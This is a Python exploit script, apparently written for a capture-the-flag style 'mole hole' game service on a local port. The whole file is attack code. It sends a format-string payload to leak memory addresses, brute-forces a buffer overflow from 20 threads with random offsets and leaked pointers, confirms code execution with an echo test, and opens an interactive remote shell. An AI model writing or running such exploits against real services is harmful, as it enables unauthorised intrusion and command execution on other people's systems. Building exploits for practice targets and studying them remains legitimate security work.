#!/usr/bin/env python3
import socket
import struct
import time
import re
import random
import sys
import threading

HOST = "127.0.0.1"  # Change as needed.
PORT = 9999

# Global event to signal that a shell was obtained.
shell_found = threading.Event()
# Lock to protect the global socket variable.
socket_lock = threading.Lock()
successful_socket = None

def recv_until(s, delim, timeout=2):
    """Receive data until a given delimiter is encountered."""
    s.settimeout(timeout)
    data = b""
    try:
        while delim not in data:
            chunk = s.recv(1)
            if not chunk:
                break
            data += chunk
    except Exception:
        pass
    finally:
        s.settimeout(None)
    return data

def parse_leaked_addresses(leak_str):
    """
    Parse the leaked output from the format string.
    Expected format is something like:
      LEAK:0xaddr1:0xaddr2:...
    Returns a list of integer addresses (ignoring any "0x0").
    """
    addrs = re.findall(r"0x[0-9a-fA-F]+", leak_str)
    return [int(addr, 16) for addr in addrs if addr != "0x0"]

def attempt_exploit():
    global successful_socket
    while not shell_found.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
        except Exception:
            continue

        try:
            # Stage 1: Wait for initial prompt.
            init_data = recv_until(s, b"Select a mole hole (1-9):")
            # Send format string payload.
            fmt_payload = "LEAK:%p:%p:%p:%p:%p:%p:%p:%p\n"
            s.sendall(fmt_payload.encode())
            leak_data = s.recv(1024).decode(errors="ignore")
        except Exception:
            s.close()
            continue

        try:
            candidates = parse_leaked_addresses(leak_data)
            if not candidates:
                s.close()
                continue

            # Randomly choose a candidate pointer from the leak.
            candidate_ptr = random.choice(candidates)
            # Randomly choose an offset between 104 and 170.
            candidate_offset = random.randint(104, 170)

            # Stage 2: Wait for power-up prompt.
            prompt = recv_until(s, b"Select a power-up (Speed/Strength):")
            # Build the overflow payload:
            #  - Filler of candidate_offset bytes.
            #  - Followed by 8 bytes of candidate_ptr.
            padding = b"A" * candidate_offset
            payload_ptr = struct.pack("<Q", candidate_ptr)
            payload = padding + payload_ptr
            payload = payload.ljust(candidate_offset + 8, b"B")
            s.sendall(payload)

            # Stage 3: Verify if a shell is spawned.
            time.sleep(0.5)
            s.sendall(b"echo HAX\n")
            time.sleep(0.5)
            resp = s.recv(4096).decode(errors="ignore")
            if "HAX" in resp:
                with socket_lock:
                    if not shell_found.is_set():
                        successful_socket = s
                        shell_found.set()
                        return
            else:
                s.close()
        except Exception:
            s.close()
            continue

def interactive_shell(s):
    print("[+] Shell obtained! Entering interactive mode. (Press Ctrl+C to exit.)")
    try:
        while True:
            cmd = input("$ ")
            if not cmd.strip():
                continue
            s.sendall((cmd + "\n").encode())
            time.sleep(0.3)
            try:
                data = s.recv(4096).decode(errors="ignore")
            except Exception:
                data = ""
            print(data, end="")
    except KeyboardInterrupt:
        print("\n[!] Exiting interactive shell.")
        s.close()

def main():
    num_threads = 20  # Number of concurrent threads.
    threads = []

    print("[*] Starting multi-threaded brute force attempts...")
    for _ in range(num_threads):
        t = threading.Thread(target=attempt_exploit)
        t.daemon = True
        t.start()
        threads.append(t)

    # Wait until one thread reports success.
    while not shell_found.is_set():
        time.sleep(0.5)

    print("[*] Exploit succeeded! Launching interactive shell.")
    interactive_shell(successful_socket)

if __name__ == "__main__":
    main()